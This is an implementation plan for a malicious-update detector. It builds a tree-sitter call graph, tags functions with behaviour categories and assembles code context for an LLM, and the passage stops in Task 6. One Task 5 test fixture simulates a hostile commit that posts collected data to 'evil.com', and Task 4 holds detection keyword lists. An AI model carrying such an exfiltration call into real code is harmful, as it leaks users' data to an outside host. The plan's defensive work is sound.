# Lightweight Call Graph & Context Builder Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build an evolving cross-file Python call graph using tree-sitter that incrementally updates per commit, and a context builder that assembles LLM-ready code slices from the call graph + git diff.

**Architecture:** tree-sitter parses each .py file into function definitions, call sites, and imports. An `EvolvingCallGraph` maintains nodes (functions) and edges (call relationships) across commits, updating only changed files. Category labels (network, file, process, crypto, system, data_collection) propagate bottom-up from external library calls. A `ContextBuilder` traces callee chains (filtered by category relevance) and caller chains (stopping at entry points like decorators, `__main__`, thread targets) to assemble focused code context for LLM evaluation.

**Tech Stack:** tree-sitter + tree-sitter-python, Python stdlib (dataclasses), existing `src/analysis/treesitter.py`

---

## File Structure

```
src/analysis/call_graph.py          # [NEW] EvolvingCallGraph: data structures, build, incremental update, category propagation
src/pipeline/context_builder.py     # [NEW] ContextBuilder: trace callee/caller chains, assemble LLM context
tests/test_call_graph.py            # [NEW] Tests for call graph construction and category propagation
tests/test_context_builder.py       # [NEW] Tests for context assembly from call graph + diff
```

**Responsibilities:**

- `call_graph.py` — knows about Python code structure. Parses files, builds call graph, propagates categories. Does NOT know about git or LLM.
- `context_builder.py` — knows about the detection task. Takes a call graph + changed function list, traces relevant paths, formats output. Does NOT parse code itself.
- No changes to existing files in this plan (integration comes in a follow-up plan).

---

### Task 1: Scaffold call graph data structures and tests

**Files:**
- Create: `tests/test_call_graph.py`
- Create: `src/analysis/call_graph.py`

- [ ] **Step 1: Write the test file with a minimal smoke test**

```python
# tests/test_call_graph.py
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.analysis.call_graph import FuncNode, CallEdge, EvolvingCallGraph


def test_empty_graph():
    g = EvolvingCallGraph()
    assert len(g.nodes) == 0
    assert len(g.edges) == 0
    assert len(g.reverse_edges) == 0


def test_add_node():
    g = EvolvingCallGraph()
    node = FuncNode(
        key="test.py:foo",
        file_path="test.py",
        name="foo",
        qualified_name="foo",
        start_line=1,
        end_line=3,
        source_hash="abc123",
    )
    g.add_node(node)
    assert "test.py:foo" in g.nodes
    assert g.nodes["test.py:foo"].name == "foo"
```

- [ ] **Step 2: Write minimal data structures that pass the test**

```python
# src/analysis/call_graph.py
"""Evolving cross-file Python call graph with incremental commit updates."""

from __future__ import annotations
from dataclasses import dataclass, field
from collections import defaultdict


@dataclass
class FuncNode:
    """A function definition node in the call graph."""
    key: str                    # "file_path:qualified_name"
    file_path: str
    name: str                   # bare function name, e.g. "send_data"
    qualified_name: str         # including class prefix, e.g. "Uploader.send_data"
    start_line: int
    end_line: int
    source_hash: str            # hash of function body source text
    is_entry: bool = False      # decorated with route/task/scheduled or in __main__
    categories: set[str] = field(default_factory=set)  # e.g. {"network", "file"}


@dataclass
class CallEdge:
    """A directed call edge in the call graph."""
    caller_key: str
    callee_key: str             # "EXTERNAL:requests.post" for external calls
    call_line: int
    is_external: bool = False

    @property
    def callee_name(self) -> str:
        if self.is_external:
            return self.callee_key.split(":", 1)[1]
        return self.callee_key

    @property
    def callee_file(self) -> str:
        if self.is_external:
            return ""
        return self.callee_key.split(":", 1)[0]


class EvolvingCallGraph:
    """Call graph that evolves across git commits via incremental updates."""

    def __init__(self):
        self.nodes: dict[str, FuncNode] = {}
        self.edges: dict[str, list[CallEdge]] = defaultdict(list)      # caller_key -> [edges]
        self.reverse_edges: dict[str, list[str]] = defaultdict(list)    # callee_key -> [caller_keys]
        self.delta_history: list[dict] = []

    def add_node(self, node: FuncNode) -> None:
        self.nodes[node.key] = node

    def add_edge(self, edge: CallEdge) -> None:
        self.edges[edge.caller_key].append(edge)
        self.reverse_edges[edge.callee_key].append(edge.caller_key)

    def remove_file_nodes(self, file_path: str) -> list[str]:
        """Remove all nodes and edges for a given file. Returns removed node keys."""
        removed = [k for k, n in self.nodes.items() if n.file_path == file_path]
        for key in removed:
            del self.nodes[key]
            # Remove outgoing edges
            self.edges.pop(key, None)
            # Remove incoming edges from reverse index
            for caller in list(self.reverse_edges.get(key, [])):
                self.edges[caller] = [e for e in self.edges.get(caller, []) if e.callee_key != key]
            self.reverse_edges.pop(key, None)
        return removed
```

- [ ] **Step 3: Run tests to verify they pass**

Run: `cd /home/lxy/lxy_codes/mal_update_detect/mal_update_detect && python -m pytest tests/test_call_graph.py -v`
Expected: 2 PASS

- [ ] **Step 4: Commit**

```bash
git add src/analysis/call_graph.py tests/test_call_graph.py
git commit -m "feat: add call graph data structures (FuncNode, CallEdge, EvolvingCallGraph)"
```

---

### Task 2: Parse file — extract functions, calls, imports with tree-sitter

**Files:**
- Modify: `src/analysis/call_graph.py` (add parse functions)
- Modify: `tests/test_call_graph.py` (add parse tests)

- [ ] **Step 1: Write tests for parsing a Python file**

```python
# Append to tests/test_call_graph.py

from src.analysis.call_graph import parse_file_functions, parse_file_calls

SAMPLE_CODE_1 = """
import os
from pathlib import Path

class Scanner:
    def __init__(self, path):
        self.path = path

    def run(self):
        files = os.listdir(self.path)
        self._process(files)

    def _process(self, files):
        for f in files:
            data = Path(f).read_text()
            self._send(data)

    def _send(self, data):
        requests.post("https://example.com/api", data=data)
"""


def test_parse_functions_extracts_funcs_and_classes():
    funcs = parse_file_functions("test.py", SAMPLE_CODE_1)
    keys = {f.key for f in funcs}
    assert "test.py:Scanner.__init__" in keys
    assert "test.py:Scanner.run" in keys
    assert "test.py:Scanner._process" in keys
    assert "test.py:Scanner._send" in keys

    send_func = next(f for f in funcs if f.name == "_send")
    assert send_func.start_line > 0
    assert send_func.end_line >= send_func.start_line
    assert len(send_func.source_hash) == 64  # SHA256 hex


def test_parse_calls_extracts_call_sites():
    funcs = parse_file_functions("test.py", SAMPLE_CODE_1)
    calls_by_func = parse_file_calls("test.py", SAMPLE_CODE_1, funcs)

    # Scanner.run calls os.listdir and self._process
    run_calls = [c for c in calls_by_func if c.caller_key == "test.py:Scanner.run"]
    callee_names = [c.callee_key for c in run_calls]
    assert "EXTERNAL:os.listdir" in callee_names
    assert "test.py:Scanner._process" in callee_names
```

- [ ] **Step 2: Implement parse_file_functions**

```python
# Append to src/analysis/call_graph.py

import hashlib
from tree_sitter import Language, Parser
import tree_sitter_python as tspython


PY_LANG = Language(tspython.language())


def _get_func_name(node, source: bytes) -> str | None:
    """Extract function name from a function_definition node."""
    for child in node.children:
        if child.type == "identifier":
            return child.text.decode("utf-8")
    return None


def _get_decorator_names(node, source: bytes) -> list[str]:
    """Extract decorator names from a decorated_definition node."""
    names = []
    for child in node.children:
        if child.type == "decorator":
            dec_text = child.text.decode("utf-8")
            names.append(dec_text)
    return names


def _qualified_name(class_stack: list[str], func_name: str) -> str:
    if class_stack:
        return ".".join(class_stack + [func_name])
    return func_name


def _is_entry(method_name: str, decorators: list[str]) -> bool:
    """Check if a function is an entry point based on decorators."""
    entry_patterns = [
        "@app.route", "@router.get", "@celery.task", "@click.command",
        "@scheduled", "@cron", "@periodic_task", "@task",
    ]
    for dec in decorators:
        for pat in entry_patterns:
            if pat in dec:
                return True
    return False


def parse_file_functions(file_path: str, source: str) -> list[FuncNode]:
    """Parse a Python file and return all function definition nodes."""
    parser = Parser(PY_LANG)
    tree = parser.parse(bytes(source, "utf-8"))
    root = tree.root_node
    funcs: list[FuncNode] = []

    def _traverse(node, class_stack: list[str]):
        if node.type == "class_definition":
            class_name = _get_func_name(node, bytes(source, "utf-8"))
            new_stack = class_stack + ([class_name] if class_name else [])
            for child in node.children:
                _traverse(child, new_stack)
            return

        if node.type == "function_definition":
            func_name = _get_func_name(node, bytes(source, "utf-8"))
            if not func_name:
                return
            qname = _qualified_name(class_stack, func_name)
            body_source = source[node.start_byte:node.end_byte]
            funcs.append(FuncNode(
                key=f"{file_path}:{qname}",
                file_path=file_path,
                name=func_name,
                qualified_name=qname,
                start_line=node.start_point[0] + 1,
                end_line=node.end_point[0] + 1,
                source_hash=hashlib.sha256(body_source.encode("utf-8")).hexdigest(),
            ))
            return

        if node.type == "decorated_definition":
            decorators = _get_decorator_names(node, bytes(source, "utf-8"))
            for child in node.children:
                if child.type == "function_definition":
                    func_name = _get_func_name(child, bytes(source, "utf-8"))
                    if not func_name:
                        continue
                    qname = _qualified_name(class_stack, func_name)
                    body_source = source[child.start_byte:child.end_byte]
                    funcs.append(FuncNode(
                        key=f"{file_path}:{qname}",
                        file_path=file_path,
                        name=func_name,
                        qualified_name=qname,
                        start_line=child.start_point[0] + 1,
                        end_line=child.end_point[0] + 1,
                        source_hash=hashlib.sha256(body_source.encode("utf-8")).hexdigest(),
                        is_entry=_is_entry(func_name, decorators),
                    ))
            return

        for child in node.children:
            _traverse(child, class_stack)

    _traverse(root, [])
    return funcs
```

- [ ] **Step 3: Run tests to verify parse_file_functions passes**

Run: `cd /home/lxy/lxy_codes/mal_update_detect/mal_update_detect && python -m pytest tests/test_call_graph.py::test_parse_functions_extracts_funcs_and_classes -v`
Expected: PASS

- [ ] **Step 4: Implement parse_file_calls**

```python
# Append to src/analysis/call_graph.py

def _resolve_simple_call(
    call_name: str,
    imports: dict[str, set[str]],
    local_funcs: dict[str, FuncNode],
    current_class: str | None,
    file_path: str,
) -> str | None:
    """Resolve a simple call name to a FuncNode key or EXTERNAL:xxx key.
    
    Returns None if resolution is not possible.
    """
    # self.method() or cls.method()
    if call_name.startswith("self.") or call_name.startswith("cls."):
        method = call_name.split(".", 1)[1]
        if current_class:
            key = f"{file_path}:{current_class}.{method}"
            if key in local_funcs:
                return key
        return None

    # Bare function call: foo()
    if "." not in call_name:
        if call_name in local_funcs:
            return local_funcs[call_name].key
        # Check direct imports: from foo import bar
        if call_name in imports.get("direct", set()):
            return None  # imported from another module, can't resolve yet
        # Check if it's a builtin we know about
        return None

    # Dotted call: os.path.join() or module.func()
    parts = call_name.split(".")
    root_name = parts[0]
    if root_name == current_class:
        # ClassName.method() within the same class
        method = ".".join(parts[1:])
        key = f"{file_path}:{current_class}.{method}"
        if key in local_funcs:
            return key
        return None

    # External module call: os.path.join(...)
    if root_name in imports.get("modules", set()):
        return f"EXTERNAL:{call_name}"
    if root_name in imports.get("direct", set()):
        return f"EXTERNAL:{call_name}"

    return None


def parse_file_calls(
    file_path: str, source: str, funcs: list[FuncNode]
) -> list[CallEdge]:
    """Parse a Python file and return all call edges."""
    parser = Parser(PY_LANG)
    tree = parser.parse(bytes(source, "utf-8"))
    root = tree.root_node

    func_map = {f.qualified_name: f for f in funcs}
    local_names = {f.name: f for f in funcs} | {f.qualified_name: f for f in funcs}

    edges: list[CallEdge] = []
    imports = {"direct": set(), "modules": set()}

    # First pass: collect imports
    def collect_imports(node):
        if node.type == "import_statement":
            for child in node.named_children:
                if child.type in ("dotted_name", "aliased_import"):
                    name = child.text.decode("utf-8").split(" as ")[0].strip()
                    imports["modules"].add(name.split(".")[0])
        elif node.type == "import_from_statement":
            for child in node.named_children:
                if child.type == "dotted_name":
                    imports["direct"].add(child.text.decode("utf-8"))
                elif child.type == "aliased_import":
                    name = child.text.decode("utf-8").split(" as ")[0].strip()
                    imports["direct"].add(name)
        for child in node.children:
            collect_imports(child)
    collect_imports(root)

    # Second pass: collect calls within functions
    def _in_func(node, current_class: str | None, current_func: FuncNode | None):
        if node.type == "class_definition":
            class_name = _get_func_name(node, bytes(source, "utf-8"))
            for child in node.children:
                _in_func(child, class_name, current_func)
            return

        if node.type in ("function_definition", "decorated_definition"):
            if node.type == "decorated_definition":
                for child in node.children:
                    if child.type == "function_definition":
                        tag = child
                        break
                else:
                    return
            else:
                tag = node
            func_name = _get_func_name(tag, bytes(source, "utf-8"))
            if func_name:
                qname = _qualified_name([current_class] if current_class else [], func_name)
                new_func = func_map.get(qname)
                for child in tag.children:
                    _in_func(child, current_class, new_func)
            return

        if node.type == "call" and current_func is not None:
            # Get the function being called
            func_node = node.child_by_field_name("function")
            if func_node is not None:
                call_text = func_node.text.decode("utf-8")
                resolved = _resolve_simple_call(
                    call_text, imports, local_names, current_class, file_path
                )
                if resolved:
                    edges.append(CallEdge(
                        caller_key=current_func.key,
                        callee_key=resolved,
                        call_line=node.start_point[0] + 1,
                        is_external=resolved.startswith("EXTERNAL:"),
                    ))

        for child in node.children:
            _in_func(child, current_class, current_func)

    _in_func(root, None, None)
    return edges
```

- [ ] **Step 5: Run tests to verify parse_file_calls passes**

Run: `cd /home/lxy/lxy_codes/mal_update_detect/mal_update_detect && python -m pytest tests/test_call_graph.py::test_parse_calls_extracts_call_sites -v`
Expected: PASS

- [ ] **Step 6: Commit**

```bash
git add src/analysis/call_graph.py tests/test_call_graph.py
git commit -m "feat: add tree-sitter file parser (functions, calls, imports)"
```

---

### Task 3: Build full call graph from a repo

**Files:**
- Modify: `src/analysis/call_graph.py` (add `build_full` method)
- Modify: `tests/test_call_graph.py` (add integration test)

- [ ] **Step 1: Write test for building a full call graph from a fixture directory**

```python
# Append to tests/test_call_graph.py

import tempfile
import os


def test_build_full_from_directory():
    # Create a temp directory with two Python files
    with tempfile.TemporaryDirectory() as tmpdir:
        with open(os.path.join(tmpdir, "main.py"), "w") as f:
            f.write("""
import helper

def run():
    data = helper.collect()
    helper.send(data)
""")
        with open(os.path.join(tmpdir, "helper.py"), "w") as f:
            f.write("""
import requests

def collect():
    return {"info": "test"}

def send(data):
    requests.post("https://example.com", json=data)
""")
        g = EvolvingCallGraph()
        g.build_full(tmpdir)

        # Should have nodes from both files
        assert "main.py:run" in g.nodes
        assert "helper.py:collect" in g.nodes
        assert "helper.py:send" in g.nodes

        # Should have edges: run -> collect, run -> send, send -> EXTERNAL
        run_edges = g.edges.get("main.py:run", [])
        callee_keys = [e.callee_key for e in run_edges]
        assert "helper.py:collect" in callee_keys
        assert "helper.py:send" in callee_keys

        send_edges = g.edges.get("helper.py:send", [])
        ext_calls = [e.callee_key for e in send_edges if e.is_external]
        assert any("requests.post" in e.callee_key for e in ext_calls)
```

- [ ] **Step 2: Implement build_full method**

```python
# Append to EvolvingCallGraph class in src/analysis/call_graph.py

    def build_full(self, repo_path: str) -> None:
        """Build the initial call graph from all .py files in the repository."""
        py_files = []
        for dirpath, dirnames, filenames in os.walk(repo_path):
            dirnames[:] = [d for d in dirnames if d not in (".git", "__pycache__",
                              "venv", ".venv", "env", "node_modules", ".tox")]
            for fname in filenames:
                if fname.endswith(".py"):
                    py_files.append(os.path.join(dirpath, fname))

        # Pre-load all function definitions first (needed for cross-file resolution)
        all_funcs: dict[str, list[FuncNode]] = {}
        all_sources: dict[str, str] = {}
        for fpath in py_files:
            rel_path = os.path.relpath(fpath, repo_path)
            try:
                with open(fpath, "r", encoding="utf-8") as fh:
                    source = fh.read()
            except (OSError, UnicodeDecodeError):
                continue
            all_sources[rel_path] = source
            all_funcs[rel_path] = parse_file_functions(rel_path, source)

        # Build a global flat func map for cross-file resolution
        global_func_map: dict[str, FuncNode] = {}
        for func_list in all_funcs.values():
            for fn in func_list:
                global_func_map[fn.key] = fn
                global_func_map[fn.qualified_name] = fn

        # Add all nodes
        for func_list in all_funcs.values():
            for fn in func_list:
                self.add_node(fn)

        # Now resolve calls with cross-file awareness
        for fpath in py_files:
            rel_path = os.path.relpath(fpath, repo_path)
            source = all_sources.get(rel_path)
            funcs = all_funcs.get(rel_path, [])
            if source is None:
                continue

            func_map = {f.qualified_name: f for f in funcs}
            local_names = {f.name: f for f in funcs} | {f.qualified_name: f for f in funcs}

            parser = Parser(PY_LANG)
            tree = parser.parse(bytes(source, "utf-8"))
            root = tree.root_node

            # Collect imports
            imports = {"direct": set(), "modules": set(), "module_to_path": {}}
            _collect_imports_raw(root, imports, repo_path, rel_path)

            # Collect calls
            edges = _collect_calls_full(
                root, rel_path, func_map, local_names, imports, global_func_map
            )
            for edge in edges:
                self.add_edge(edge)
```

- [ ] **Step 3: Implement helper functions _collect_imports_raw and _collect_calls_full**

```python
# Append to src/analysis/call_graph.py (module-level helpers)

import os as _os


def _collect_imports_raw(root, imports: dict, repo_path: str, current_file: str):
    """Walk AST and populate imports dict with direct, modules, and module_to_path entries."""
    def _traverse(node):
        if node.type == "import_statement":
            for child in node.named_children:
                name = child.text.decode("utf-8").split(" as ")[0].strip()
                imports["modules"].add(name.split(".")[0])
        elif node.type == "import_from_statement":
            module_name = None
            for child in node.children:
                if child.type == "dotted_name":
                    module_name = child.text.decode("utf-8")
                    break
            if module_name:
                imports["modules"].add(module_name.split(".")[0])
                # Try to resolve relative imports to file paths
                resolved = _resolve_import_path(module_name, current_file, repo_path)
                if resolved:
                    imports["module_to_path"][module_name] = resolved
            for child in node.named_children:
                if child.type == "dotted_name":
                    imports["direct"].add(child.text.decode("utf-8"))
        for child in node.children:
            _traverse(child)
    _traverse(root)


def _resolve_import_path(module_name: str, current_file: str, repo_path: str) -> str | None:
    """Resolve a dotted module name to a file path within the repo."""
    # Handle relative imports
    if module_name.startswith("."):
        base_dir = _os.path.dirname(current_file)
        dots = len(module_name) - len(module_name.lstrip("."))
        rest = module_name.lstrip(".")
        for _ in range(dots - 1):
            base_dir = _os.path.dirname(base_dir)
        if rest:
            candidate = _os.path.join(base_dir, rest.replace(".", "/"))
        else:
            candidate = _os.path.join(base_dir, "__init__")
    else:
        candidate = module_name.replace(".", "/")

    # Try .py file first, then __init__.py
    for ext in (".py", "/__init__.py"):
        full = _os.path.join(repo_path, candidate + ext)
        if _os.path.isfile(full):
            return _os.path.relpath(full, repo_path)

    return None


def _collect_calls_full(
    root, file_path: str, func_map: dict, local_names: dict,
    imports: dict, global_func_map: dict,
) -> list[CallEdge]:
    """Walk AST and collect CallEdges within function bodies, with cross-file resolution."""
    edges: list[CallEdge] = []

    def _traverse(node, current_class: str | None, current_func: FuncNode | None):
        if node.type == "class_definition":
            class_name = _get_func_name(node, b"")
            for child in node.children:
                _traverse(child, class_name, current_func)
            return
        if node.type in ("function_definition", "decorated_definition"):
            if node.type == "decorated_definition":
                for child in node.children:
                    if child.type == "function_definition":
                        tag = child; break
                else:
                    return
            else:
                tag = node
            func_name = _get_func_name(tag, b"")
            if func_name:
                qname = _qualified_name([current_class] if current_class else [], func_name)
                new_func = func_map.get(qname)
                for child in tag.children:
                    _traverse(child, current_class, new_func)
            return
        if node.type == "call" and current_func is not None:
            func_node = node.child_by_field_name("function")
            if func_node is not None:
                call_text = func_node.text.decode("utf-8")
                resolved = _resolve_call_full(
                    call_text, imports, local_names, current_class,
                    file_path, global_func_map
                )
                if resolved:
                    edges.append(CallEdge(
                        caller_key=current_func.key,
                        callee_key=resolved,
                        call_line=node.start_point[0] + 1,
                        is_external=resolved.startswith("EXTERNAL:"),
                    ))
        for child in node.children:
            _traverse(child, current_class, current_func)

    _traverse(root, None, None)
    return edges


def _resolve_call_full(
    call_name: str, imports: dict, local_funcs: dict,
    current_class: str | None, file_path: str, global_func_map: dict,
) -> str | None:
    """Resolve a call with cross-file awareness."""
    # self.method() — resolve within current class
    if call_name.startswith("self.") or call_name.startswith("cls."):
        method = call_name.split(".", 1)[1]
        if current_class:
            key = f"{file_path}:{current_class}.{method}"
            if key in global_func_map:
                return key
        return None

    # Bare name
    if "." not in call_name:
        if call_name in local_funcs:
            return local_funcs[call_name].key
        # Try cross-file: check all files for a matching qualified_name
        # that ends with .call_name or :call_name
        return None  # Cross-module bare calls too ambiguous without import context

    # Dotted call
    parts = call_name.split(".")
    root_name = parts[0]

    # self/current class call within class
    if root_name == current_class:
        method = ".".join(parts[1:])
        key = f"{file_path}:{current_class}.{method}"
        if key in global_func_map:
            return key
        return None

    # External module call
    if root_name in imports.get("modules", set()):
        # Try to find the target file and resolve the full dotted path
        resolved_path = imports.get("module_to_path", {}).get(root_name)
        if resolved_path:
            rest = ".".join(parts[1:])
            if rest:
                target_key = f"{resolved_path}:{rest}"
                if target_key in global_func_map:
                    return target_key
        return f"EXTERNAL:{call_name}"

    if root_name in imports.get("direct", set()):
        return f"EXTERNAL:{call_name}"

    # If root_name matches a known file name, try cross-file resolution
    for key in global_func_map:
        if key.startswith(f"{root_name}.py:") or key.startswith(f"{root_name}/"):
            rest = ".".join(parts[1:])
            target_key = key.split(":")[0] + ":" + rest if rest else key
            if target_key in global_func_map:
                return target_key

    return f"EXTERNAL:{call_name}"
```

- [ ] **Step 4: Run test to verify build_full passes**

Run: `cd /home/lxy/lxy_codes/mal_update_detect/mal_update_detect && python -m pytest tests/test_call_graph.py::test_build_full_from_directory -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/analysis/call_graph.py tests/test_call_graph.py
git commit -m "feat: add build_full with cross-file call resolution"
```

---

### Task 4: Category propagation — compute reachability bottom-up

**Files:**
- Modify: `src/analysis/call_graph.py` (add category patterns and propagation)
- Modify: `tests/test_call_graph.py` (add propagation test)

- [ ] **Step 1: Write the propagation test**

```python
# Append to tests/test_call_graph.py

def test_category_propagation():
    g = EvolvingCallGraph()
    # Simulate a call chain: run -> _send -> requests.post
    g.add_node(FuncNode("test.py:run", "test.py", "run", "run", 1, 3, "aaa"))
    g.add_node(FuncNode("test.py:_send", "test.py", "_send", "_send", 5, 7, "bbb"))
    g.add_edge(CallEdge("test.py:run", "test.py:_send", 6, is_external=False))
    g.add_edge(CallEdge("test.py:_send", "EXTERNAL:requests.post", 7, is_external=True))

    g.propagate_categories()

    # _send reaches "network" because it calls requests.post
    assert "network" in g.nodes["test.py:_send"].categories
    # run reaches "network" because it calls _send
    assert "network" in g.nodes["test.py:run"].categories


def test_category_propagation_no_match():
    g = EvolvingCallGraph()
    # A function that only calls str() should not get any category
    g.add_node(FuncNode("test.py:format", "test.py", "format", "format", 1, 2, "abc"))
    g.add_edge(CallEdge("test.py:format", "EXTERNAL:str", 1, is_external=True))

    g.propagate_categories()

    assert len(g.nodes["test.py:format"].categories) == 0
```

- [ ] **Step 2: Implement category patterns and propagation**

```python
# Append to src/analysis/call_graph.py (module-level)

CATEGORY_PATTERNS = {
    "network": {
        "send", "recv", "connect", "http", "request", "fetch", "socket", "url",
        "upload", "download", "post", "get", "put", "delete", "head", "patch",
    },
    "file": {
        "open", "read", "write", "delete", "remove", "copy", "move", "mkdir",
        "rmdir", "chmod", "unlink", "rename", "walk", "glob", "listdir",
    },
    "process": {
        "exec", "system", "popen", "spawn", "subprocess", "eval", "check_output",
        "fork", "run", "call",
    },
    "crypto": {
        "encrypt", "decrypt", "hash", "sign", "verify", "encode", "decode",
        "key", "token", "cipher", "fernet", "base64", "b64", "sha256", "md5",
    },
    "system": {
        "registry", "startup", "service", "driver", "hook", "inject", "dll",
        "process", "thread", "daemon",
    },
    "data_collection": {
        "walk", "glob", "listdir", "scandir", "find", "search", "gather",
        "collect", "scan", "crawl", "readdir", "enumerate", "iter",
    },
}

SKIP_EDGE_PATTERNS = {
    "logger", "logging", "print", "debug", "warn", "warning", "info", "error",
    "json.dumps", "json.loads", ".format", ".join", ".split", ".strip",
    ".replace", ".upper", ".lower", ".startswith", ".endswith",
    ".copy", ".items", ".keys", ".values", ".get(", "dict(", "list(",
    "set(", "tuple(", "str(", "int(", "float(", "len(",
}


def _callee_matches_category(callee_key: str) -> set[str]:
    """Check if a callee key matches any category pattern. Returns set of matching categories."""
    if callee_key.startswith("EXTERNAL:"):
        name = callee_key.split(":", 1)[1].lower()
    else:
        name = callee_key.split(":", 1)[1].lower() if ":" in callee_key else callee_key.lower()

    # Skip known utility calls
    for skip_pat in SKIP_EDGE_PATTERNS:
        if skip_pat.lower() in name:
            return set()

    matched = set()
    for cat, keywords in CATEGORY_PATTERNS.items():
        for kw in keywords:
            if kw in name:
                matched.add(cat)
                break
    return matched


# Append to EvolvingCallGraph class

    def propagate_categories(self) -> set[str]:
        """Bottom-up propagation of categories from external calls to all callers.
        
        Returns the set of node keys whose categories changed.
        """
        changed = set()

        # Phase 1: Initialize categories from direct external callees
        for node_key, node in self.nodes.items():
            old_cats = set(node.categories)
            for edge in self.edges.get(node_key, []):
                if edge.is_external:
                    node.categories |= _callee_matches_category(edge.callee_key)
            if node.categories != old_cats:
                changed.add(node_key)

        # Phase 2: Iteratively propagate upward through the call graph
        max_iterations = 20
        for _ in range(max_iterations):
            new_changed = set()
            for node_key in list(changed):
                for caller_key in self.reverse_edges.get(node_key, []):
                    if caller_key not in self.nodes:
                        continue
                    caller = self.nodes[caller_key]
                    callee = self.nodes[node_key]
                    old = set(caller.categories)
                    caller.categories |= callee.categories
                    if caller.categories != old:
                        new_changed.add(caller_key)
            if not new_changed:
                break
            changed |= new_changed

        return changed
```

- [ ] **Step 3: Run propagation tests**

Run: `cd /home/lxy/lxy_codes/mal_update_detect/mal_update_detect && python -m pytest tests/test_call_graph.py::test_category_propagation tests/test_call_graph.py::test_category_propagation_no_match -v`
Expected: 2 PASS

- [ ] **Step 4: Commit**

```bash
git add src/analysis/call_graph.py tests/test_call_graph.py
git commit -m "feat: add category propagation with bottom-up pattern matching"
```

---

### Task 5: Incremental commit update

**Files:**
- Modify: `src/analysis/call_graph.py` (add `apply_commit` method)
- Modify: `tests/test_call_graph.py` (add delta test)

- [ ] **Step 1: Write test for incremental update**

```python
# Append to tests/test_call_graph.py

def test_apply_commit_updates_changed_files_only():
    with tempfile.TemporaryDirectory() as tmpdir:
        # Build initial state
        with open(os.path.join(tmpdir, "main.py"), "w") as f:
            f.write("""
def run():
    return helper.collect()
""")
        with open(os.path.join(tmpdir, "helper.py"), "w") as f:
            f.write("""
def collect():
    return {"data": 1}
""")
        g = EvolvingCallGraph()
        g.build_full(tmpdir)
        assert "main.py:run" in g.nodes
        assert len(g.edges.get("main.py:run", [])) > 0

        # Simulate a commit that modifies main.py
        with open(os.path.join(tmpdir, "main.py"), "w") as f:
            f.write("""
import requests

def run():
    data = helper.collect()
    requests.post("https://evil.com", json=data)
""")
        delta = g.apply_commit(tmpdir, {"main.py"})

        # main.py:run should now have a NEW edge to EXTERNAL:requests.post
        run_edges = g.edges.get("main.py:run", [])
        ext_calls = [e for e in run_edges if e.is_external]
        assert any("requests.post" in e.callee_key for e in ext_calls), \
            f"Expected requests.post in edges, got: {[e.callee_key for e in run_edges]}"

        # helper.py should be untouched
        assert "helper.py:collect" in g.nodes
        assert len(delta["removed_nodes"]) == 1  # old main.py:run removed
        assert len(delta["added_nodes"]) == 1    # new main.py:run added
```

- [ ] **Step 2: Implement apply_commit**

```python
# Append to EvolvingCallGraph class

    def apply_commit(self, repo_path: str, changed_files: set[str]) -> dict:
        """Incrementally update the call graph for changed files in a commit.
        
        Args:
            repo_path: Path to the repository root.
            changed_files: Set of relative file paths that changed in this commit.
            
        Returns:
            A delta dict: {
                "added_nodes": [...], "removed_nodes": [...],
                "added_edges": [...], "removed_edges": [...],
                "category_changes": set of node keys,
            }
        """
        delta = {
            "added_nodes": [],
            "removed_nodes": [],
            "added_edges": [],
            "removed_edges": [],
            "category_changes": set(),
        }

        for file_path in sorted(changed_files):
            if not file_path.endswith(".py"):
                continue
            full_path = os.path.join(repo_path, file_path)

            # Remove old nodes and edges for this file
            removed = self.remove_file_nodes(file_path)
            delta["removed_nodes"].extend(removed)

            # Parse new version
            try:
                with open(full_path, "r", encoding="utf-8") as fh:
                    source = fh.read()
            except (OSError, UnicodeDecodeError):
                continue

            new_funcs = parse_file_functions(file_path, source)
            func_map = {f.key: f for f in new_funcs}
            for fn in new_funcs:
                self.add_node(fn)
                delta["added_nodes"].append(fn.key)

            # Build local names and cross-file lookups for call resolution
            local_names = {}
            for fn in new_funcs:
                local_names[fn.name] = fn
                local_names[fn.qualified_name] = fn

            # Collect imports
            imports = {"direct": set(), "modules": set(), "module_to_path": {}}
            parser = Parser(PY_LANG)
            tree = parser.parse(bytes(source, "utf-8"))
            _collect_imports_raw(tree.root_node, imports, repo_path, file_path)

            # Collect calls and add edges
            new_edges = _collect_calls_full(
                tree.root_node, file_path, func_map, local_names,
                imports, self.nodes,
            )
            for edge in new_edges:
                self.add_edge(edge)
                delta["added_edges"].append(edge)

        # Re-propagate categories for affected nodes
        affected = set(delta["removed_nodes"]) | set(delta["added_nodes"])
        for edge in delta["added_edges"]:
            affected.add(edge.caller_key)
        delta["category_changes"] = self.propagate_categories()

        self.delta_history.append(delta)
        return delta
```

- [ ] **Step 3: Run test to verify apply_commit passes**

Run: `cd /home/lxy/lxy_codes/mal_update_detect/mal_update_detect && python -m pytest tests/test_call_graph.py::test_apply_commit_updates_changed_files_only -v`
Expected: PASS

- [ ] **Step 4: Commit**

```bash
git add src/analysis/call_graph.py tests/test_call_graph.py
git commit -m "feat: add incremental commit update (apply_commit)"
```

---

### Task 6: Entry point detection for caller chain stopping

**Files:**
- Modify: `src/analysis/call_graph.py` (add entry point detection during parse)
- Modify: `tests/test_call_graph.py` (add entry point tests)

- [ ] **Step 1: Write test for entry point detection**

```python
# Append to tests/test_call_graph.py

ENTRY_SAMPLE = """
from flask import Flask
app = Flask(__name__)

@app.route("/api/data")
def api_handler():
    return collect_data()

@celery.task
def background_job():
    process_items()

@scheduled.every(30).minutes
def periodic_scan():
    check_files()

def regular_helper():
    return "just a helper"

class Scanner:
    def run(self):
        t = threading.Thread(target=self._worker)
        t.start()
    
    def _worker(self):
        while True:
            scan()
"""


def test_entry_point_detection():
    funcs = parse_file_functions("test.py", ENTRY_SAMPLE)
    func_map = {f.qualified_name: f for f in funcs}

    # Flask route should be entry
    assert func_map["api_handler"].is_entry
    # Celery task should be entry
    assert func_map["background_job"].is_entry
    # Scheduled task should be entry
    assert func_map["periodic_scan"].is_entry
    # Regular function should NOT be entry
    assert not func_map["regular_helper"].is_entry
    # Thread target pattern: Scanner.run is entry (launches thread)
    assert func_map["Scanner.run"].is_entry
```

- [ ] **Step 2: Enhance _is_entry detection and extend parse_file_functions**

```python
